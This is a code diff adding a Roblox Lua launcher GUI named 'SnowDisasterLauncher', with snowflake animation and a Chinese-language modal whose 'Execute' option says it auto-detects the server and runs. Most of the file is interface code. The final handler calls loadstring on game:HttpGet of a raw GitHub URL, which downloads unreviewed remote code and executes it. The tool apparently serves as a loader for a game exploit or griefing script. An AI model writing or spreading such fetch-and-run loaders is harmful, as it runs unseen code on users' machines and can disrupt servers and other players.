@@ -1,4 +1,209 @@
-local msg = Instance.new("Message",workspace)
-msg.Text = "Test"
-wait(1.8)
-msg:Destroy()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "SnowDisasterLauncher"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- ===== 雪花特效系统 =====
+local snowContainer = Instance.new("Frame", gui)
+snowContainer.Size = UDim2.fromScale(1, 1)
+snowContainer.BackgroundTransparency = 1
+snowContainer.ZIndex = 1
+
+local snowflakes = {}
+local snowCount = 50
+
+-- 创建雪花
+for i = 1, snowCount do
+	local snow = Instance.new("TextLabel", snowContainer)
+	snow.Size = UDim2.new(0, math.random(8, 16), 0, math.random(8, 16))
+	snow.Position = UDim2.new(math.random(), 0, math.random(), 0)
+	snow.BackgroundTransparency = 1
+	snow.Text = "❄"
+	snow.TextColor3 = Color3.fromRGB(200, 220, 255)
+	snow.TextStrokeTransparency = 0.8
+	snow.TextStrokeColor3 = Color3.fromRGB(150, 200, 255)
+	snow.Font = Enum.Font.GothamBold
+	snow.TextScaled = true
+	snow.ZIndex = 1
+	
+	-- 雪花属性
+	snowflakes[i] = {
+		instance = snow,
+		speed = math.random(20, 60) / 100,
+		wobble = math.random(10, 30) / 100,
+		wobbleSpeed = math.random(5, 15) / 10,
+		rotationSpeed = math.random(-5, 5)
+	}
+end
+
+-- 雪花动画
+local connection
+connection = RunService.RenderStepped:Connect(function(deltaTime)
+	for _, snowData in ipairs(snowflakes) do
+		local snow = snowData.instance
+		local pos = snow.Position
+		
+		-- 向下移动
+		pos = UDim2.new(
+			pos.X.Scale, pos.X.Offset,
+			pos.Y.Scale + snowData.speed * deltaTime, pos.Y.Offset
+		)
+		
+		-- 左右摆动
+		local wobble = math.sin(tick() * snowData.wobbleSpeed) * snowData.wobble
+		snow.Rotation += snowData.rotationSpeed
+		
+		-- 如果雪花到底部，重置到顶部
+		if pos.Y.Scale > 1 then
+			pos = UDim2.new(math.random(), 0, -0.1, 0)
+		end
+		
+		snow.Position = pos
+	end
+end)
+
+-- ===== 弹窗主体 =====
+local modal = Instance.new("Frame", gui)
+modal.AnchorPoint = Vector2.new(0.5, 0.5)
+modal.Position = UDim2.new(0.5, 0, -0.5, 0) -- 初始在屏幕外上方
+modal.Size = UDim2.new(0, 360, 0, 260)
+modal.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+modal.BorderSizePixel = 0
+modal.ZIndex = 2
+
+local corner = Instance.new("UICorner", modal)
+corner.CornerRadius = UDim.new(0, 12)
+
+-- 弹窗弹出动画
+TweenService:Create(modal, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+	Position = UDim2.new(0.5, 0, 0.5, 0)
+}):Play()
+
+-- ===== 标题 =====
+local title = Instance.new("TextLabel", modal)
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundTransparency = 1
+title.Text = "选择方案"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 24
+title.TextColor3 = Color3.new(0, 0, 0)
+title.ZIndex = 2
+
+-- ===== 选项容器 =====
+local container = Instance.new("Frame", modal)
+container.Size = UDim2.new(1, -40, 0, 120)
+container.Position = UDim2.new(0, 20, 0, 70)
+container.BackgroundTransparency = 1
+container.ZIndex = 2
+
+local selected = "Execute"
+
+local function createOption(name, main, sub, yPos)
+	local btn = Instance.new("TextButton", container)
+	btn.Size = UDim2.new(1, 0, 0, 50)
+	btn.Position = UDim2.new(0, 0, 0, yPos)
+	btn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+	btn.BorderSizePixel = 0
+	btn.AutoButtonColor = false
+	btn.ZIndex = 2
+
+	local c = Instance.new("UICorner", btn)
+	c.CornerRadius = UDim.new(0, 8)
+
+	local stroke = Instance.new("UIStroke", btn)
+	stroke.Thickness = 2
+	stroke.Color = name == "Execute" and Color3.fromRGB(0, 120, 255) or Color3.fromRGB(200, 200, 200)
+
+	if name == "Execute" then
+		btn.BackgroundColor3 = Color3.fromRGB(235, 245, 255)
+	end
+
+	local mainTxt = Instance.new("TextLabel", btn)
+	mainTxt.Size = UDim2.new(1, -20, 0.5, 0)
+	mainTxt.Position = UDim2.new(0, 15, 0, 5)
+	mainTxt.BackgroundTransparency = 1
+	mainTxt.Text = main
+	mainTxt.Font = Enum.Font.SourceSansSemibold
+	mainTxt.TextSize = 18
+	mainTxt.TextXAlignment = Enum.TextXAlignment.Left
+	mainTxt.TextColor3 = name == "Execute" and Color3.fromRGB(0, 120, 255) or Color3.fromRGB(80, 80, 80)
+	mainTxt.ZIndex = 2
+
+	local subTxt = Instance.new("TextLabel", btn)
+	subTxt.Size = UDim2.new(1, -20, 0.5, 0)
+	subTxt.Position = UDim2.new(0, 15, 0.5, 0)
+	subTxt.BackgroundTransparency = 1
+	subTxt.Text = sub
+	subTxt.Font = Enum.Font.SourceSans
+	subTxt.TextSize = 14
+	subTxt.TextXAlignment = Enum.TextXAlignment.Left
+	subTxt.TextColor3 = Color3.fromRGB(100, 100, 100)
+	subTxt.ZIndex = 2
+
+	btn.MouseButton1Click:Connect(function()
+		selected = name
+		stroke.Color = Color3.fromRGB(0, 120, 255)
+		btn.BackgroundColor3 = Color3.fromRGB(235, 245, 255)
+
+		for _, v in ipairs(container:GetChildren()) do
+			if v:IsA("TextButton") and v ~= btn then
+				v.UIStroke.Color = Color3.fromRGB(200, 200, 200)
+				v.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+			end
+		end
+	end)
+end
+
+createOption("Execute", "执行", "自动检测服务器并执行", 0)
+createOption("Exit", "退出", "null", 60)
+
+-- ===== 确定按钮 =====
+local confirm = Instance.new("TextButton", modal)
+confirm.Size = UDim2.new(1, -40, 0, 50)
+confirm.Position = UDim2.new(0, 20, 1, -70)
+confirm.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+confirm.Text = "确定"
+confirm.Font = Enum.Font.SourceSansBold
+confirm.TextSize = 20
+confirm.TextColor3 = Color3.new(1, 1, 1)
+confirm.AutoButtonColor = false
+confirm.ZIndex = 2
+
+local cc = Instance.new("UICorner", confirm)
+cc.CornerRadius = UDim.new(0, 25)
+
+-- ===== 确定按钮点击事件 =====
+confirm.MouseButton1Click:Connect(function()
+	-- 停止雪花动画
+	connection:Disconnect()
+	
+	-- 向中间缩小消失动画
+	local shrinkInfo = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+	local shrinkTween = TweenService:Create(modal, shrinkInfo, {
+		Size = UDim2.new(0, 0, 0, 0),
+		Position = UDim2.new(0.5, 0, 0.5, 0),
+		BackgroundTransparency = 1
+	})
+	
+	shrinkTween:Play()
+	shrinkTween.Completed:Wait()
+	
+	-- 清除雪花
+	for _, snowData in ipairs(snowflakes) do
+		snowData.instance:Destroy()
+	end
+	snowContainer:Destroy()
+	
+	gui:Destroy()
+	
+	if selected == "Execute" then
+		loadstring(game:HttpGet(
+			"https://raw.githubusercontent.com/smalldesikon/snow-disaster/refs/heads/main/%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B"
+		))()
+	end
+end)
